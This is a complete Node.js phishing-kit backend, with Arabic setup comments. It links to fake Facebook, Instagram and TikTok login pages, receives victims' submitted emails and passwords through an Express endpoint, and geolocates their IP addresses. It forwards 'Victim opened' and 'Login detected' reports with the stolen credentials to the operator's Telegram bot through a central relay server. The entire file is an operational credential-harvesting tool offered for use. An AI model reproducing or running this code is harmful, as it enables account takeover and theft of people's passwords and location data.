#!/usr/bin/env node
const express=require('express')
const {Telegraf}=require('telegraf')
const axios=require('axios')
const ua=require('ua-parser-js')
const readline=require('readline')

const rl=readline.createInterface({input:process.stdin,output:process.stdout})
const ask=q=>new Promise(res=>rl.question(q,ans=>res(ans)))

// ⚠️ عدّل هذا برابط Replit الذي حصلت عليه
const CENTRAL_SERVER='https://central-server--mosmanhacker.replit.app'

// ⚠️ عدّل هذا لأسماء حساباتك الثانوية
const PAGES={
  fb:'https://mosmanhacker.github.io/fb',
  ig:'https://instagram-mosmanhem.github.io/ig',
  tt:'https://tiktok-mosmanhem.github.io/tt'
}

async function main(){
  const TOKEN=process.env.TOKEN||await ask('BOT_TOKEN: ')
  const MASTER=process.env.MASTER||await ask('MASTER_ID: ')

  console.log('\n1- Facebook\n2- Instagram\n3- TikTok')
  const c=(await ask('Select page (1-3): ')).trim()
  const p=['fb','ig','tt'][parseInt(c)-1]||'fb'

  rl.close()

  require('fs').writeFileSync('.env',`TOKEN=${TOKEN}\nMASTER=${MASTER}`)

  const bot=new Telegraf(TOKEN)
  const app=express()
  app.use(express.json({limit:'1mb'}))
  app.use(express.urlencoded({extended:true}))

  // ✅ تسجيل المستخدم في الخادم الوسط
  await axios.post(`${CENTRAL_SERVER}/register`,{
    id: MASTER,
    platform: p
  }).catch(()=>console.log('⚠️  Failed to register user'))

  // ✅ رسالة اتصال تلقائية
  bot.telegram.sendMessage(MASTER,`✅ Connected!`).catch(()=>{})

  const ext=`${PAGES[p]}/?id=${MASTER}`
  const int=`http://localhost:8080/${p}`
  console.log(`\n🌍 Public URL: ${ext}`)
  console.log(`🏠 Local URL:  ${int}\n`)

  // ✅ استقبال البيانات من الخادم الوسط
  app.post('/',async(q,r)=>{
    const{id,email,pass,ua:s,ip}=q.body
    if(id!==MASTER)return r.sendStatus(403) // تأمين

    const dev=ua(s||q.headers['user-agent'])
    const geo=await axios.get(`http://ip-api.com/json/${ip}`).catch(()=>({data:{}}))
    
    if(!email&&!pass){
      const msg=`🔥 Victim opened\nPlatform: ${p}\nIP: ${ip}\nCountry: ${geo.data.country||'?'}\nDevice: ${dev.os.name||'?'} ${dev.device.model||''}\nBrowser: ${dev.browser.name||'?'}`
      bot.telegram.sendMessage(MASTER,msg).catch(()=>{})
    }else{
      const msg=`✅ Login detected\nPlatform: ${p}\nEmail: ${email}\nPass: ${pass}\nIP: ${ip}`
      bot.telegram.sendMessage(MASTER,msg).catch(()=>{})
    }
    r.sendStatus(200)
  })

  bot.launch()
  app.listen(8080,'0.0.0.0',()=>console.log('Server running...\n'))
}
main()
